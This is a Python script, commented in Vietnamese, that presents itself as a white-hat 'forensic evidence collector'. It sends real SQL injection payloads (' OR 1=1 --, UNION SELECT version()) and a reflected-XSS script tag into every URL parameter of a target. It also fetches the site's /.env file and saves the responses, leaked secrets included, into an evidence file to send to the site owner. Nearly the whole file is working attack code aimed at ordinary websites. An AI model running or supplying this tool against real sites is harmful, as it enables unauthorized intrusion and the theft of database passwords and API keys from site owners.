import sys
import requests
import time
import datetime
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import Fore, Style, init

init(autoreset=True)

# CẤU HÌNH PHÁP CHỨNG
FORENSIC_FILE = ""
TARGET_DOMAIN = ""

def print_banner():
    print(Fore.RED + """
    =======================================================
    SECURITY TOOL V7 - FORENSIC EVIDENCE COLLECTOR
    (Thực thi khai thác thật & Ghi lại bằng chứng số)
    Level: White Hat Professional | Coder: Người anh em
    =======================================================
    """)
    print(Fore.YELLOW + "CẢNH BÁO: Tool này gửi Request thật. Chỉ dùng khi ĐƯỢC PHÉP.")

# HÀM GHI LOG PHÁP CHỨNG (Ghi lại sự thật trần trụi)
def write_evidence(attack_type, url, payload, response_headers, response_body, proof_explanation):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(FORENSIC_FILE, "a", encoding="utf-8") as f:
        f.write("\n" + "="*80 + "\n")
        f.write(f"THỜI GIAN: {timestamp}\n")
        f.write(f"LOẠI TẤN CÔNG: {attack_type}\n")
        f.write(f"MỤC TIÊU (URL): {url}\n")
        f.write("-" * 80 + "\n")
        f.write(f"[HACKER GỬI - PAYLOAD]: {payload}\n")
        f.write("-" * 80 + "\n")
        f.write(f"[SERVER TRẢ LỜI - HEADERS]:\n{response_headers}\n")
        f.write("-" * 80 + "\n")
        f.write(f"[SERVER TRẢ LỜI - BODY (Trích dẫn bằng chứng)]:\n{response_body[:500]} ...\n") # Chỉ lấy 500 ký tự đầu
        f.write("-" * 80 + "\n")
        f.write(f"KẾT LUẬN THIỆT HẠI: {proof_explanation}\n")
        f.write("="*80 + "\n")
    
    print(Fore.GREEN + f"[✓] Đã ghi lại bằng chứng tấn công: {attack_type}")

# 1. THỰC CHIẾN SQL INJECTION (PROOF OF ACCESS)
def exploit_sqli_real(url):
    print(Fore.CYAN + "\n[*] Đang thực hiện SQL Injection (Safe Mode)...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print(Fore.WHITE + "[-] Không có tham số để test SQLi.")
        return

    # Payload an toàn: Hỏi server phiên bản Database là gì?
    # Nếu server trả lời, tức là ta đã điều khiển được nó.
    # Payload này cố tình tạo lỗi để server "nôn" ra thông tin
    payloads = ["' OR 1=1 -- ", "' AND 1=0 -- ", "' UNION SELECT 1, version() -- "]
    
    for param in params:
        for payload in payloads:
            # Tạo URL tấn công
            params_copy = params.copy()
            params_copy[param] = [payload]
            attack_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params_copy, doseq=True)}"
            
            try:
                # Gửi request thật
                res = requests.get(attack_url, timeout=5, headers={'User-Agent': 'Security-Audit-V7'})
                
                # Phân tích phản hồi
                is_vulnerable = False
                explanation = ""
                
                if "SQL" in res.text or "syntax" in res.text:
                    is_vulnerable = True
                    explanation = "Server đã lộ lỗi cú pháp SQL (SQL Syntax Error). Điều này chứng minh Hacker có thể tiêm lệnh vào Database."
                elif payload == "' OR 1=1 -- " and len(res.text) > 1000: # Giả sử trang web trả về nhiều dữ liệu hơn bình thường
                    is_vulnerable = True
                    explanation = "Server đã trả về TOÀN BỘ dữ liệu (Bypass Authentication) do điều kiện 1=1 luôn đúng."

                if is_vulnerable:
                    print(Fore.RED + f"[!] PHÁT HIỆN LỖI TẠI: {param}")
                    write_evidence(
                        "SQL INJECTION", 
                        attack_url, 
                        payload, 
                        str(res.headers), 
                        res.text.strip(), 
                        f"THIỆT HẠI: Hacker có thể đọc/xóa toàn bộ Database. {explanation}"
                    )
                    return # Chỉ cần 1 bằng chứng là đủ
            except Exception as e:
                print(Fore.RED + f"Lỗi kết nối: {e}")

# 2. THỰC CHIẾN XSS (REFLECTED PROOF)
def exploit_xss_real(url):
    print(Fore.CYAN + "\n[*] Đang thực hiện Reflected XSS (Safe Token)...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params: return

    # Payload: Một chuỗi định danh duy nhất (Token)
    token = "HACKER_MU_TRANG_DA_O_DAY"
    payload = f"<script>console.log('{token}')</script>"
    
    for param in params:
        params_copy = params.copy()
        params_copy[param] = [payload]
        attack_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params_copy, doseq=True)}"
        
        try:
            res = requests.get(attack_url, timeout=5)
            # Kiểm tra xem token có bị server phản hồi lại nguyên văn không
            if token in res.text and payload in res.text:
                print(Fore.RED + f"[!] PHÁT HIỆN XSS TẠI: {param}")
                write_evidence(
                    "REFLECTED XSS", 
                    attack_url, 
                    payload, 
                    str(res.headers), 
                    res.text, # Lưu body để họ thấy script nằm trong đó
                    "THIỆT HẠI: Hacker có thể chạy Javascript trên máy khách hàng, đánh cắp Cookie/Session Admin."
                )
                return
        except:
            pass

# 3. THỰC CHIẾN LỘ FILE (SERVER CONFIG)
def exploit_sensitive_real(url):
    print(Fore.CYAN + "\n[*] Đang kiểm tra lộ file cấu hình (.env)...")
    domain_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    target_file = ".env"
    attack_url = f"{domain_url}/{target_file}"
    
    try:
        res = requests.get(attack_url, timeout=5)
        if res.status_code == 200 and "APP_KEY" in res.text:
            print(Fore.RED + "[!] PHÁT HIỆN FILE .ENV")
            write_evidence(
                "SENSITIVE FILE DISCLOSURE", 
                attack_url, 
                "GET /.env HTTP/1.1", 
                str(res.headers), 
                res.text, 
                "THIỆT HẠI: Lộ toàn bộ mật khẩu Database, API Key, Cloud Secret. Hacker có quyền cao nhất Server."
            )
        else:
            print(Fore.WHITE + "[-] Không tải được file .env (An toàn).")
    except:
        pass

def main():
    global FORENSIC_FILE, TARGET_DOMAIN
    print_banner()
    
    target = input(Fore.YELLOW + "Nhập URL mục tiêu (vd: http://testphp.vulnweb.com/listproducts.php?cat=1): ").strip()
    if not target.startswith("http"):
        print(Fore.RED + "Vui lòng nhập http://")
        return

    domain = urlparse(target).netloc
    TARGET_DOMAIN = domain
    FORENSIC_FILE = f"BANG_CHUNG_PHAP_CHUNG_{domain}.txt"
    
    # Tạo file log mới
    with open(FORENSIC_FILE, "w", encoding="utf-8") as f:
        f.write(f"HỒ SƠ BẰNG CHỨNG TẤN CÔNG THỰC TẾ (FORENSIC LOG)\n")
        f.write(f"Mục tiêu: {target}\n")
        f.write(f"Ngày thực hiện: {datetime.datetime.now()}\n")
        f.write(f"Người thực hiện: White Hat Security Researcher\n")
        f.write(f"CAM KẾT: Tool này chỉ gửi mã khai thác để chứng minh (Proof of Concept).\n")
        f.write(f"Không có dữ liệu nào bị xóa hay thay đổi trong quá trình này.\n")
        f.write("="*80 + "\n")

    print(Fore.YELLOW + "\n[*] BẮT ĐẦU QUÁ TRÌNH KHAI THÁC THỰC TẾ (LIVE EXPLOIT)...")
    
    exploit_sqli_real(target)
    exploit_xss_real(target)
    exploit_sensitive_real(target)
    
    print(Fore.GREEN + "\n" + "="*60)
    print(Fore.GREEN + f"HOÀN TẤT! Đã lưu hồ sơ bằng chứng tại: {FORENSIC_FILE}")
    print(Fore.GREEN + "Gửi file này cho họ. Đây là bằng chứng Server của họ đã 'thất thủ'.")
    print(Fore.GREEN + "="*60)

if __name__ == "__main__":
    main()